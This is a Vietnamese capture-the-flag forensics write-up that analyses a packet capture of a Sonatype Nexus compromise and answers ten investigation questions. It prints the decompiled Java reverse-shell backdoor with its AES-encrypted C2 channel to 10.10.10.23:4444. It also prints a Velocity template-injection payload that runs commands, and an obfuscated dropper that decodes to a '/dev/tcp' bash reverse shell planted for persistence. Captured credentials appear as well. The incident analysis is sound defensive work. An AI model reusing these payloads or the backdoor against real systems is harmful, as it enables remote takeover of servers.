# Mô tả

In an era fraught with cyber threats, Talion "Byte Doctor" Reyes, a former digital forensics examiner for an international crime lab, has uncovered evidence of a breach targeting critical systems vital to national infrastructure. Subtle traces of malicious activity point to a covert operation orchestrated by the Empire of Volnaya, a nation notorious for its expertise in cyber sabotage and hybrid warfare tactics.

The breach threatens to disrupt essential services that Task Force Phoenix relies on in its ongoing fight against the expansion of the Empire of Volnaya. The attackers have exploited vulnerabilities in interconnected systems, employing sophisticated techniques to evade detection and trigger widespread disruption

Can you analyze the digital remnants left behind, reconstruct the attack timeline, and uncover the full extent of the threat?

Bài cho ta một file pcap

# Phân tích

## Tổng quan

Trước khi đi vào giải thì khi mở file pcap ra thấy khá nhiều các request HTTP cho nên ta sẽ liệt kê các url ra trước

```bash
$ tshark -r capture.pcap -Y "http.request" -T fields -e http.request.uri | sort -u
/nexus/service/local/authentication/login
/nexus/service/local/repositories/releases/content/com/artsploit/nexus-rce/maven-metadata.xml
/nexus/service/local/repositories/releases/content//.nexus/attributes/com/artsploit/nexus-rce/maven-metadata.xml
/nexus/service/local/repositories/snapshots/content/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar
/nexus/service/local/status
/nexus/service/local/users
```

## [1/10] Which credentials has been used to login on the platform? (e.g. username:password)

Khi filter `http contains "/login"` trong wireshark thấy rất nhiều request lên `/login`

```http
GET /nexus/service/local/authentication/login HTTP/1.1
Host: phoenix.htb:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept-Encoding: gzip, deflate
Accept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json
Connection: keep-alive
X-Nexus-UI: true
X-Requested-With: XMLHttpRequest
Authorization: Basic YWRtaW5pc3RyYXRvcjpVQTE2azUxaGlJSG5ESXVMczA=
```

Phần lớn các phản hồi từ server đều là code **401 Unauthorized**  => Kẻ tấn công đang muốn bruteforce tk và mk. Để ý thì sẽ thấy tại mục `Authorization` có một đoạn mã B64 khi decode sẽ ra `administrator:UA16k51hiIHnDIuLs0` vậy là hacker đã chèn tk:mk qua header request 

Muốn biết được tk và mk chính xác thì ta chỉ cần filter thêm **http.response.code eq 200 && http.request.uri contains "/login"** sau đó xem phần request là sẽ ra (frame 906)

```http 
Basic YWRtaW46ZEw0enlWSjF5OFVoVDFoWDFt
```

`admin:dL4zyVJ1y8UhT1hX1m`

## [2/10] Which Nexus OSS version is in use? (e.g. 1.10.0-01)

Filter `http.request.uri contains "/status"` sẽ tìm thấy một file json chứa các giá trị của server Nexus OSS

```json
{"data":{"appName":"Nexus Repository Manager","formattedAppName":"Nexus Repository Manager OSS 2.15.1-02","version":"2.15.1-02","apiVersion":"2.15.1-02","editionLong":"","editionShort":"OSS","attributionsURL":"http://links.sonatype.com/products/nexus/oss/attributions","purchaseURL":"http://links.sonatype.com/products/nexus/oss/store","userLicenseURL":"http://links.sonatype.com/products/nexus/oss/EULA","state":"STARTED","initializedAt":"2025-03-24 17:51:09.886 UTC","startedAt":"2025-03-24 17:51:10.674 UTC","lastConfigChange":"2025-03-24 17:51:10.674 UTC","firstStart":false,"instanceUpgraded":false,"configurationUpgraded":false,"baseUrl":"http://phoenix.htb:8081/nexus","licenseInstalled":false,"licenseExpired":false,"trialLicense":false}}
```

`2.15.1-02`

## [3/10] The attacker created a new user for persistence. Which credentials has been set? (e.g. username:password)

Filter `http.request.uri contains "/users"` cũng có một file json

```json
{"data":{"resourceURI":"http://phoenix.htb:8081/nexus/service/local/users/adm1n1str4t0r","userId":"adm1n1str4t0r","password":"46vaGuj566","firstName":"Persistent","lastName":"Admin","status":"active","email":"adm1n1str4t0r@phoenix.htb","roles":["nx-admin"]}}
```

`adm1n1str4t0r:46vaGuj566`

## [4/10] One core library written in Java has been tampered and replaced by a malicious one. Which is its package name? (e.g. com.company.name)

Bây giờ ta sẽ phải đi phân tích code java, khi liệt kê endpoints ở trên thì biết rằng có truy cập `/nexus/service/local/repositories/snapshots/content/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar` nên ta sẽ vào phần `exports` trong wireshark để xuất file jar ra sau đó decompile về [code java gốc](https://www.decompiler.com/jar/e787c8050c624d619e1399a3161b8ba1/PhoenixCyberToolkit-1.0.jar). Thấy rằng đây là một request PUT để đưa file này lên server, có thể file jar đã bị chỉnh sửa để đưa mã độc vào

Sau khi decompile xong ta có 2 thư mục là `com` và `META-INF` vào trong `/com/phoenix/toolkit/App.java` sẽ thấy một src code java khá  bất thường đã bị obfuscated cho nên khá chắc chắn rằng thư viện `com.phoenix.toolkit` đã bị thay đổi bằng mã độc

`com.phoenix.toolkit`

## [5/10] The tampered library contains encrypted communication logic. What is the secret key used for session encryption? (e.g. Secret123)

Phân tích file `App.java`

Để biết thuận tiện cho phân tích cách mã hoá và giải mã như nào, tôi(chatgbt) đã chỉnh sửa lại tên biến và hàm để dễ đọc hơn

```java
package com.phoenix.toolkit;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class App {
   // Các phần mã hóa key
   private static final String part1 = Base64.getEncoder().encodeToString(xorBytes("3t9834".getBytes(), 55));
   private static final String part2 = Base64.getEncoder().encodeToString(xorBytes("s3cr".getBytes(), 77));
   private static final String part3 = Base64.getEncoder().encodeToString(xorBytes("354r".getBytes(), 23));
   private static final String part4 = Base64.getEncoder().encodeToString(xorBytes("34".getBytes(), 42));
   private static final int[] keyOrder = new int[]{3, 2, 1, 0};

   public static void main(String[] args) {
      String serverIP = "10.10.10.23";
      short serverPort = 4444;

      try {
         String aesKey = buildAESKey();
         Socket socket = new Socket(serverIP, serverPort);
         BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
         BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));

         while (true) {
            String encryptedCommand = reader.readLine();
            if (encryptedCommand == null) break;

            String command = decrypt(encryptedCommand, aesKey);
            if (command.equals("exit")) break;

            String commandOutput = executeCommand(command);
            String encryptedOutput = encrypt(commandOutput, aesKey);

            writer.write(encryptedOutput + "\n");
            writer.flush();
         }

         socket.close();
      } catch (Exception e) {
         e.printStackTrace();
      }
   }

   // Ghép và giải mã các phần để tạo khóa AES
   private static String buildAESKey() throws Exception {
      String[] parts = new String[]{
         decodePart(part1, 55),
         decodePart(part2, 77),
         decodePart(part3, 23),
         decodePart(part4, 42)
      };

      StringBuilder keyBuilder = new StringBuilder();
      for (int i : keyOrder) {
         keyBuilder.append(parts[i]);
      }

      return transformKey(keyBuilder.toString());
   }

   // Giải mã từng phần key (Base64 -> XOR)
   private static String decodePart(String encoded, int xorKey) {
      byte[] decoded = Base64.getDecoder().decode(encoded);
      byte[] xored = xorBytes(decoded, xorKey);
      return new String(xored, StandardCharsets.UTF_8);
   }

   // XOR một mảng byte với một giá trị
   private static byte[] xorBytes(byte[] input, int xorKey) {
      byte[] output = new byte[input.length];
      for (int i = 0; i < input.length; i++) {
         output[i] = (byte)(input[i] ^ xorKey);
      }
      return output;
   }

   // Biến đổi cuối cùng lên key (char-level transformation)
   private static String transformKey(String rawKey) {
      StringBuilder transformed = new StringBuilder();
      int xorSeed = 7;
      for (char c : rawKey.toCharArray()) {
         int shifted = ((c ^ xorSeed) + 33) % 94 + 33;
         transformed.append((char) shifted);
      }
      return transformed.toString();
   }

   // Chạy lệnh hệ thống
   private static String executeCommand(String command) throws IOException {
      Process process = Runtime.getRuntime().exec(command);
      BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
      StringBuilder output = new StringBuilder();
      String line;

      while ((line = reader.readLine()) != null) {
         output.append(line).append("\n");
      }

      return output.toString();
   }

   // Mã hóa kết quả trả về bằng AES + Base64
   private static String encrypt(String plaintext, String aesKey) throws Exception {
      SecretKeySpec keySpec = new SecretKeySpec(aesKey.getBytes(StandardCharsets.UTF_8), "AES");
      Cipher cipher = Cipher.getInstance("AES");
      cipher.init(Cipher.ENCRYPT_MODE, keySpec);
      byte[] encrypted = cipher.doFinal(plaintext.getBytes());
      return Base64.getEncoder().encodeToString(encrypted);
   }

   // Giải mã lệnh được nhận bằng AES + Base64
   private static String decrypt(String encrypted, String aesKey) throws Exception {
      SecretKeySpec keySpec = new SecretKeySpec(aesKey.getBytes(StandardCharsets.UTF_8), "AES");
      Cipher cipher = Cipher.getInstance("AES");
      cipher.init(Cipher.DECRYPT_MODE, keySpec);
      byte[] decoded = Base64.getDecoder().decode(encrypted);
      return new String(cipher.doFinal(decoded));
   }
}
```

Để tìm được key mà mã hoá AES sử dụng ta sẽ phải phân tích logic của hàm **buildAESKey** 

```java
    // Ghép và giải mã các phần để tạo khóa AES
   private static String buildAESKey() throws Exception {
      String[] parts = new String[]{
         decodePart(part1, 55),
         decodePart(part2, 77),
         decodePart(part3, 23),
         decodePart(part4, 42)
      };

      StringBuilder keyBuilder = new StringBuilder();
      for (int i : keyOrder) {
         keyBuilder.append(parts[i]);
      }

      return transformKey(keyBuilder.toString());
   }
```

Trước hết là chương trình đã xor các String (4 phần) có sắn với các số nguyên, và khi key cuối cùng sẽ có thứ tự đảo ngược lại (Part4,3,2,1)

```java
   private static final String part1 = Base64.getEncoder().encodeToString(xorBytes("3t9834".getBytes(), 55));
   private static final String part2 = Base64.getEncoder().encodeToString(xorBytes("s3cr".getBytes(), 77));
   private static final String part3 = Base64.getEncoder().encodeToString(xorBytes("354r".getBytes(), 23));
   private static final String part4 = Base64.getEncoder().encodeToString(xorBytes("34".getBytes(), 42));
   private static final int[] keyOrder = new int[]{3, 2, 1, 0};   
   // Giải mã từng phần key (Base64 -> XOR)
   private static String decodePart(String encoded, int xorKey) {
      byte[] decoded = Base64.getDecoder().decode(encoded);
      byte[] xored = xorBytes(decoded, xorKey);
      return new String(xored, StandardCharsets.UTF_8);
   }
	// Khi giải mã sẽ decode B64 trước sau đó mới xor lại với các số nguyên kia rồi sắp xếp đúng thứ tự
    String[] parts = new String[]{
         decodePart(part1, 55),
         decodePart(part2, 77),
         decodePart(part3, 23),
         decodePart(part4, 42)
      };

      StringBuilder keyBuilder = new StringBuilder();
      for (int i : keyOrder) {
         keyBuilder.append(parts[i]);
      }
```

Vậy ta sẽ có chuỗi **34354rs3cr3t9834**. Nhưng trong hàmb**buildAESKey()** thì key chính xác được trả về qua `return transformKey(keyBuilder.toString());` vậy ta còn bước phân tích `transformKey()` xem nó được biến đổi như nào nữa

```java
   private static String transformKey(String rawKey) {
      StringBuilder transformed = new StringBuilder();
      int xorSeed = 7;
      for (char c : rawKey.toCharArray()) {
         int shifted = ((c ^ xorSeed) + 33) % 94 + 33;
         transformed.append((char) shifted);
      }
      return transformed.toString();
   }
```

Logic chính của hàm này là `int shifted = ((c ^ 7) + 33) % 94 + 33;` với biến **c** là các ký tự nằm trong chuỗi `34354rs3cr3t9834`

Vậy ta chỉ cần viết một script python đơn giản để dịch lại ra key chính xác

```py
rawKey = "34354rs3cr3t9834"
realKey = ""
for c in rawKey:
    shifted = ((ord(c) ^ 7) + 33) % 94 + 33
    realKey += chr(shifted)
    
print(realKey)
```

Ta có key **vuvtuYXvHYvW"#vu**

## [6/10] Which is the name of the function that manages the (AES) string decryption process? (e.g. aVf41)

```java
   // Mã hóa kết quả trả về bằng AES + Base64
   private static String encrypt(String plaintext, String aesKey) throws Exception {
      SecretKeySpec keySpec = new SecretKeySpec(aesKey.getBytes(StandardCharsets.UTF_8), "AES");
      Cipher cipher = Cipher.getInstance("AES");
      cipher.init(Cipher.ENCRYPT_MODE, keySpec);
      byte[] encrypted = cipher.doFinal(plaintext.getBytes());
      return Base64.getEncoder().encodeToString(encrypted);
   }

   // Giải mã lệnh được nhận bằng AES + Base64
   private static String decrypt(String encrypted, String aesKey) throws Exception {
      SecretKeySpec keySpec = new SecretKeySpec(aesKey.getBytes(StandardCharsets.UTF_8), "AES");
      Cipher cipher = Cipher.getInstance("AES");
      cipher.init(Cipher.DECRYPT_MODE, keySpec);
      byte[] decoded = Base64.getDecoder().decode(encrypted);
      return new String(cipher.doFinal(decoded));
   }
}
```

Có 2 function thực hiện AES nhưng **aFbGtr4(Trong code gốc)** chỉ trả về một đoạn bytes được mã hoá B64 => Đây là quá trình mã hoá 

Còn **uJtXq5(Trong code gốc)** sẽ trả về String => Giải mã

`uJtXq5`

## [7/10] Which is the system command that triggered the reverse shell execution for this session running the tampered JAR? (e.g. "java .... &")

Cái này nói đến system command nên là không nằm trong `App.java` nữa mà ta sẽ tìm lại trong file pcap

Trong những endpoints đã liệt kê từ đầu còn 2 cái chưa kiểm tra cho nên ta sẽ filter `http.request.uri contains "/maven-metadata.xml"` và tại frame 924 ta thấy hacker đã chạy lệnh trên server

```http
PUT /nexus/service/local/repositories/releases/content/com/artsploit/nexus-rce/maven-metadata.xml HTTP/1.1
Host: phoenix.htb:8081
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: text/xml
Authorization: Basic YWRtaW46ZEw0enlWSjF5OFVoVDFoWDFt
Cookie: NXSESSIONID=acf4d986-6884-4583-8721-0fdaf94b2506
Content-Length: 563

#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("java -jar /sonatype-work/storage/snapshots/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar &"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
$output
```

`PhoenixCyberToolkit-1.0.jar` đã được chạy ở background, file này đã giúp hacker có được một reverse shell và nhận lệnh từ một C2 server (10.10.10.23:4444)

`java -jar /sonatype-work/storage/snapshots/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar &`

## [8/10] Which is the first executed command in the encrypted reverse shell session? (e.g. whoami)

Khi hacker tạo được một reverse shell trên server và thiết lập kết nối đến server C2 thì tiếp theo sẽ thường gửi lệnh và nhận lại kết quả của lệnh đó qua C2

Từ file App.java ta biết được server C2 có địa chỉ `10.10.10.23:4444` cho nên ta sẽ filter trong wireshark `ip.addr == 10.10.10.23 && tcp.port == 4444 && data.data` sẽ thấy phần data có nhiều đoạn mã B64 được gửi qua lại giữa C2 và server Nexus. Nhưng tất nhiên khi decode B64 bình thường sẽ không thể ra do file `App.java` đã áp dụng thêm các phương thức mã hoá mới khi gửi lệnh 

Trước hết xuất các dữ liệu đó ra đã

```bash
$ tshark -r capture.pcap -Y "ip.addr == 10.10.10.23 && tcp.port == 4444 && data.data" -T fields -e data.data | xxd -r -p > data.txt
```

Biết được key là **vuvtuYXvHYvW"#vu**

Và cách giải mã

```java
   private static String decrypt(String encrypted, String aesKey) throws Exception {
      SecretKeySpec keySpec = new SecretKeySpec(aesKey.getBytes(StandardCharsets.UTF_8), "AES");
      Cipher cipher = Cipher.getInstance("AES");
      cipher.init(Cipher.DECRYPT_MODE, keySpec);
      byte[] decoded = Base64.getDecoder().decode(encrypted);
      return new String(cipher.doFinal(decoded));
   }
}
```

Ta viết một script để giải mã các đoạn B64 trong `data.txt`

```py
from base64 import b64decode
from Crypto.Cipher import AES

# AES key giống như mã Java đã phân tích
AES_KEY = b'vuvtuYXvHYvW"#vu'  # 16 bytes

def decrypt_base64_aes(base64_str):
    cipher = AES.new(AES_KEY, AES.MODE_ECB)
    encrypted_bytes = b64decode(base64_str)
    decrypted_bytes = cipher.decrypt(encrypted_bytes)

    # Remove potential padding (PKCS7)
    pad_len = decrypted_bytes[-1]
    if all(b == pad_len for b in decrypted_bytes[-pad_len:]):
        decrypted_bytes = decrypted_bytes[:-pad_len]

    return decrypted_bytes.decode(errors='ignore')

def main():
    with open("data.txt", "r") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                plaintext = decrypt_base64_aes(line)
                print("[+] Decrypted:", plaintext)
            except Exception as e:
                print("[-] Failed to decrypt:", line)
                print("    Reason:", e)

if __name__ == "__main__":
    main()
```

Chạy và lưu vào file `commands.txt`

`uname -a`

## [9/10] Which other legit user has admin permissions on the Nexus instance (excluding "adm1n1str4t0r" and "admin")? (e.g. john_doe)

Trong các lệnh mà hacker đã chạy trên server có `cat /sonatype-work/conf/security.xml` để đọc các thông tin về bảo mật, trong đây có chưa thông tin của các người dùng và quyền của họ, ta có thể lưu output của lệnh này vào file .xml cho dễ đọc

```xml
<userId>john_smith</userId>
<source>default</source>
<roles>
<role>nx-admin</role>
</roles>
```

`john_smith`

## [10/10] The attacker wrote something in a specific file to maintain persistence, which is the full path? (e.g. /path/file)

Trong 2 câu lệnh cuối hacker thực hiện

```bash
echo "Z0g0PSJFZCI7a00wPSJ4U3oiO2M9ImNoIjtMPSI0IjtyUVc9IiI7ZkUxPSJsUSI7cz0iICc9b2djbFJYWWtCWGR0Z1hhdVYyYm9Cbkx2VTJaaEozYjBOM0xySjNiMzFTWndsSGRoNTJiejlDSTR0Q0lrOVdib05HSW1ZQ0l5VkdkaFJHYzExQ2VwNVdadmhHY3U4U1puRm1jdlIzY3ZzbWN2ZFhMbEJYZTBGbWJ2TjNMZzRESWlFakorQURJMFFETjA4eU15NENNeDRDTXg0Q014OENjalIzTDJWR1p2QWlKK0FTYXRBQ2F6Rm1ZaUF5Ym9OV1oKJyB8IHIiO0h4Sj0icyI7SGMyPSIiO2Y9ImFzIjtrY0U9InBhcyI7Y0VmPSJhZSI7ZD0ibyI7Vjl6PSI2IjtQOGM9ImlmIjtVPSIgLWQiO0pjPSJlZiI7TjBxPSIiO3Y9ImIiO3c9ImUiO2I9InYgfCI7VHg9IkVkcyI7eFpwPSIiCng9JChldmFsICIkSGMyJHckYyRyUVckZCRzJHckYiRIYzIkdiR4WnAkZiR3JFY5eiRyUVckTCRVJHhacCIpCmV2YWwgIiROMHEkeCRIYzIkclFXIgo=" | base64 --decode | sh
```

Đã chạy một lệnh gì đó được mã hoá B64, vậy ta chỉ cần làm lại (Bỏ lệnh sh để không chạy)

```bash
$ echo "Z0g0PSJFZCI7a00wPSJ4U3oiO2M9ImNoIjtMPSI0IjtyUVc9IiI7ZkUxPSJsUSI7cz0iICc9b2djbFJYWWtCWGR0Z1hhdVYyYm9Cbkx2VTJaaEozYjBOM0xySjNiMzFTWndsSGRoNTJiejlDSTR0Q0lrOVdib05HSW1ZQ0l5VkdkaFJHYzExQ2VwNVdadmhHY3U4U1puRm1jdlIzY3ZzbWN2ZFhMbEJYZTBGbWJ2TjNMZzRESWlFakorQURJMFFETjA4eU15NENNeDRDTXg0Q014OENjalIzTDJWR1p2QWlKK0FTYXRBQ2F6Rm1ZaUF5Ym9OV1oKJyB8IHIiO0h4Sj0icyI7SGMyPSIiO2Y9ImFzIjtrY0U9InBhcyI7Y0VmPSJhZSI7ZD0ibyI7Vjl6PSI2IjtQOGM9ImlmIjtVPSIgLWQiO0pjPSJlZiI7TjBxPSIiO3Y9ImIiO3c9ImUiO2I9InYgfCI7VHg9IkVkcyI7eFpwPSIiCng9JChldmFsICIkSGMyJHckYyRyUVckZCRzJHckYiRIYzIkdiR4WnAkZiR3JFY5eiRyUVckTCRVJHhacCIpCmV2YWwgIiROMHEkeCRIYzIkclFXIgo=" | base64 --decode

gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=ogclRXYkBXdtgXauV2boBnLvU2ZhJ3b0N3LrJ3b31SZwlHdh52bz9CI4tCIk9WboNGImYCIyVGdhRGc11Cep5WZvhGcu8SZnFmcvR3cvsmcvdXLlBXe0FmbvN3Lg4DIiEjJ+ADI0QDN08yMy4CMx4CMx4CMx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
```

Lại là một đoạn bash shell bị obfuscated, ghép nhiều chuỗi vào với nhau và thực hiện lệnh bằng `eval`, giải lại bằng tay hoặc nhờ AI

```bash
gH4="Ed";
kM0="xSz";
c="ch";
L="4";
rQW="";
fE1="lQ";
s=" '=ogclRXYkBXdtgXauV2boBnLvU2ZhJ3b0N3LrJ3b31SZwlHdh52bz9CI4tCIk9WboNGImYCIyVGdhRGc11Cep5WZvhGcu8SZnFmcvR3cvsmcvdXLlBXe0FmbvN3Lg4DIiEjJ+ADI0QDN08yMy4CMx4CMx4CMx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ
' | r";
HxJ="s";
Hc2="";
f="as";
kcE="pas";
cEf="ae";
d="o";
V9z="6";
P8c="if";
U=" -d";
Jc="ef";
N0q="";
v="b";
w="e";
b="v |";
Tx="Eds";
xZp=""

x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")

# x = echo '=ogclRXYkBXdtgXauV2boBnLvU2ZhJ3b0N3LrJ3b31SZwlHdh52bz9CI4tCIk9WboNGImYCIyVGdhRGc11Cep5WZvhGcu8SZnFmcvR3cvsmcvdXLlBXe0FmbvN3Lg4DIiEjJ+ADI0QDN08yMy4CMx4CMx4CMx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ' | rev |base64 -d

eval "$N0q$x$Hc2$rQW"

# Lệnh cuối cùng
# echo '=ogclRXYkBXdtgXauV2boBnLvU2ZhJ3b0N3LrJ3b31SZwlHdh52bz9CI4tCIk9WboNGImYCIyVGdhRGc11Cep5WZvhGcu8SZnFmcvR3cvsmcvdXLlBXe0FmbvN3Lg4DIiEjJ+ADI0QDN08yMy4CMx4CMx4CMx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ' | rev |base64 -d
```

```bash
$ echo '=ogclRXYkBXdtgXauV2boBnLvU2ZhJ3b0N3LrJ3b31SZwlHdh52bz9CI4tCIk9WboNGImYCIyVGdhRGc11Cep5WZvhGcu8SZnFmcvR3cvsmcvdXLlBXe0FmbvN3Lg4DIiEjJ+ADI0QDN08yMy4CMx4CMx4CMx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ' | rev |base64 -d

echo "bash -i >& /dev/tcp/10.10.10.23/4444 0>&1" > /sonatype-work/storage/.phoenix-updater && chmod +x /sonatype-work/storage/.phoenix-updater
```

Hacker đã ghi `bash -i >& /dev/tcp/10.10.10.23/4444 0>&1` vào file `/sonatype-work/storage/.phoenix-updater` sau đó cho nó lệnh thực thi. Vậy mỗi khi file `.phoenix-updater` được thực thi thì hacker sẽ có quyền truy cập shell trên server từ xa qua C2

`/sonatype-work/storage/.phoenix-updater`
